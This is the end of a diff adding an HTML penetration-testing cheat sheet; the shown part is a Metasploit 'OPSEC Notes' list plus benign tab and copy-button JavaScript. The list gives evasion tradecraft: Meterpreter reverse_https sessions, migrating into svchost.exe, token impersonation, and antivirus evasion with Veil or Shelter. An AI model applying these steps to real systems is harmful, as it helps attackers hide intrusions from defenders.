+    <div class="section">
+      <div class="section-title">OPSEC Notes</div>
+      <div class="opsec-card">
+        <div class="opsec-header"><span class="opsec-icon">⚠</span> Operational Security</div>
+        <ul class="opsec-list">
+          <li class="opsec-item">Meterpreter over <code>reverse_https</code> blends with web traffic and encrypts the session</li>
+          <li class="opsec-item">Use <code>migrate</code> immediately into a less-monitored process (<code>svchost.exe</code>, <code>explorer.exe</code>) after session open</li>
+          <li class="opsec-item">Avoid <code>getsystem</code> on EDR-heavy endpoints — token manipulation via named pipes is flagged</li>
+          <li class="opsec-item">Use staged payloads (<code>reverse_https</code>) to minimize disk artifact size — stager is tiny, stage loads in-memory</li>
+          <li class="opsec-item">Set <code>InitialAutoRunScript migrate -f</code> for automatic migration when a session opens</li>
+          <li class="opsec-item">Use <code>load incognito</code> for token impersonation as an alternative to the kiwi extension</li>
+          <li class="opsec-item">MSF payloads are heavily signatured — use custom encoders, Veil, or Shelter to evade static AV</li>
+        </ul>
+      </div>
+    </div>
+
+  </div><!-- /panel-msf -->
+
+</div><!-- /.main -->
+
+<script>
+/* ── Tab switching ── */
+function switchTab(id) {
+  // Deactivate all tabs and panels
+  document.querySelectorAll('.fw-tab').forEach(function(t){ t.classList.remove('active'); t.setAttribute('aria-selected','false'); });
+  document.querySelectorAll('.fw-panel').forEach(function(p){ p.classList.remove('active'); });
+
+  // Activate selected
+  var btn = document.getElementById('tab-' + id);
+  var panel = document.getElementById('panel-' + id);
+  if (btn)   { btn.classList.add('active');   btn.setAttribute('aria-selected','true'); }
+  if (panel) { panel.classList.add('active'); }
+}
+
+/* ── Copy button ── */
+function copyBlock(btn) {
+  // Walk up to .cmd-block, then grab the <pre> text
+  var block = btn.closest('.cmd-block');
+  var pre   = block ? block.querySelector('pre') : null;
+  var table = block ? block.querySelector('.cmd-table') : null;
+
+  var text = '';
+  if (pre) {
+    text = pre.innerText || pre.textContent;
+  } else if (table) {
+    // cmd-table: "command  —  description" per row
+    var rows = table.querySelectorAll('tr');
+    var lines = [];
+    rows.forEach(function(r){
+      var cells = r.querySelectorAll('td');
+      if (cells.length >= 1) lines.push(cells[0].textContent.trim());
+    });
+    text = lines.join('\n');
+  }
+
+  if (!text) return;
+  navigator.clipboard.writeText(text.trim()).then(function(){
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(function(){ btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 1800);
+  }).catch(function(){
+    /* fallback */
+    var ta = document.createElement('textarea');
+    ta.value = text.trim();
+    ta.style.cssText = 'position:fixed;opacity:0;';
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(function(){ btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 1800);
+  });
+}
+</script>
+</body>
+</html>
